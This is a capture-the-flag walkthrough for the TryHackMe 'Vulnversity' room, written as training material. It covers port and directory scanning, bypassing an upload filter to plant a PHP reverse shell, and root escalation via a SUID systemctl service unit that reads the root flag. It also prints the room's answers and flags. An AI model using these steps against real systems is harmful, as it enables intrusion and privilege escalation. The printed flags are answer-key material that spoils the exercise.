![Vulnversity Banner](https://i.imgur.com/JFYfwL8.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Cover.png" alt="Vulnversity Logo">
</p>

# [Vulnversity](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/vulnversity)

This guide contains the answer and steps necessary to get to them for the [Vulnversity](https://tryhackme.com/room/vulnversity) room.

## Table of contents

- [Reconnaissance](#reconnaissance)
- [Locating directories using GoBuster](#locating-directories-using-gobuster)
- [Compromise the webserver](#compromise-the-webserver)
- [Privilege Escalation](#privilege-escalation)

## Reconnaissance

In this task we will be using `nmap` to find out more about our target machine. We can get the answers for all these question with the following command:

```cmd
nmap -sV 10.10.70.180
```

![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Nmap.png)

2. Scan the box, how many ports are open?
   
   Just count the number of services listed on the scan.
   
   ><details><summary>Click for answer</summary>6</details>
   
3. What version of the squid proxy is running on the machine?

   This information is given through the `-sV` argument.

   ><details><summary>Click for answer</summary>3.5.12</details>

4. How many ports will nmap scan if the flag -p-400 was used?

   Using `nmap --help` we can get more information on the various arguments. 

   ><details><summary>Click for answer</summary>400</details>

5. Using the nmap flag -n what will it not resolve?

   Using `nmap --help` we can get more information on the various arguments. 

   ><details><summary>Click for answer</summary>DNS</details>

6. What is the most likely operating system this machine is running?

   For this we can look at the information on the various services. 

   ><details><summary>Click for answer</summary>Ubuntu</details>

7. What port is the web server running on?

   This can also be found on the scan results. Look for an Apache/http service.

   ><details><summary>Click for answer</summary>3333</details>
   
## Locating directories using GoBuster

In this task we will be using `dirsearch` or ` gobuster` to find any hidden directories on the webserver.

2. What is the directory that has an upload form page?

   For this we can use both `dirsearch` and `gobuster`, the commands are similar and the results as well.
   
   ```cmd
   dirsearch -u http://10.10.70.180:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   
   gobuster dir -u http://10.10.70.180:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   ```
   
   ![Dirsearch Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Dirsearch.png)
   
   ![Gobuster Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Gobuster.png)
   
   After navigating to the results we find here, we can see which directory has an upload form.
   
   ![Website Form](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Form.png)

   ><details><summary>Click for answer</summary>/internal/</details>

## Compromise the webserver

In this task we will exploit the filtering of a file upload form to get a reverse shell.

1. What common file type, which you'd want to upload to exploit the server, is blocked? Try a couple to find out.

   We can download one of the images we found on the other directory with:
   
   ```cmd
   curl http://10.10.70.180:3333/images/loc.png --output loc.png
   ```
   
   Then make a couple copies with different extensions such as: `.php`, `.html`, `.js`, `.jpg` etc. We can upload them to the webserver to find out which ones are blocked.
   
   ![Form Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Upload.png)

   ><details><summary>Click for answer</summary>.php</details>

3. Run this attack, what extension is allowed?

   We open the form again in our browser and enable FoxyProxy to intercept the traffic with BurpSuite. We upload an example file and send the intercepted request to intruder.
   
   ![Burp Proxy](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Burp_Proxy.png)
   
   Go to Intruder and the positions tab. Here we need to clear all and add a position for the extension as followed.
   
   ![Burp Intruder](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Burp_Intruder.png)
   
   Next, in the payload tab we need to add the extension for Burpsuite to try.
   
   ![Burp Payload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Burp_Payload.png)
   
   Set the attack mode to sniper and start the attack.
   
   ![Burp Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Burp_Intruder_Result.png)
   
   We should be seing one of the extensions to have either a different status or length. Unfortunately, for some reason, it couldn't get it to work. After manually trying, I found `.phtml` to be working.

   ><details><summary>Click for answer</summary>.phtml</details>

5. What is the name of the user who manages the webserver?

   To get into the system we can use a `php-reverse-shell`. These can be found in `/usr/share/webshells/`. We just need to edit the file to contain our machines IP address and a port we want to use.
   
   ![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Reverse_Shell_Script.png)
   
   After uploading we start a listener on port 1337 with netcat and navigate to `internal/uploads` to access our shell.
   
   ![Netcat](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Netcat.png)
   
   To find any users on the machine we can either enumerate the home directory or look at the `passwd` file.
   
   ```cmd
   ls -lh /home/
   ```
   
   ![Users](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_User.png)

   ><details><summary>Click for answer</summary>bill</details>

6. What is the user flag?

   We can navigate to bill home folder and look for the flag.
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Flag.png)

   ><details><summary>Click for answer</summary>8bd7992fbe8a6ad22a63361004cfcedb</details>

## Privilege Escalation

In this task we will escalate our priveleges with SUID exploitation.

1. On the system, search for all SUID files. What file stands out?

   We can look for any binaries with their SUID bit set with:
   
   ```cmd
   find / -perm -4000 2>/dev/null
   ```
   
   ![SUID](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_SUID.png)
   
   Checking GTFOBins, we come accross `systemctl` which we can use without `sudo`.
   
   ><details><summary>Click for answer</summary>/bin/systemctl</details>

2. Become root and get the last flag (/root/root.txt)

   Using the commands from GTFOBins we can write a custom code snippet to enter into the shell:
   
   ```cmd
   TF=$(mktemp).service
   echo '[Service]
   Type=oneshot
   ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output.txt"
   [Install]
   WantedBy=multi-user.target' > $TF
   /bin/systemctl link $TF
   /bin/systemctl enable --now $TF
   ```
   
   ![GTFOBins Systemctl](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_GTFOBins.png)
   
   We use the `/tmp/` folder as this is usually always accessible for everyone on the machine.
   
   I didn't have any luck at first, so I tried again after stabalizing our shell on the machine with:
   
   ```cmd
   python -c 'import pty; pty.spawn("/bin/bash")'
   ```
   
   ![Shel Stabalize](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Shell_Stabalize.png)
   
   Trying again did yield a results, but I had to hit `enter` again for the final command to execute. Now we can navigate to the output file and read its contents.
   
   ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/vulnversity/Vulnversity_Root_Flag.png)

   ><details><summary>Click for answer</summary>a58ff8579f0a9270368d33a9966c7fd5</details>
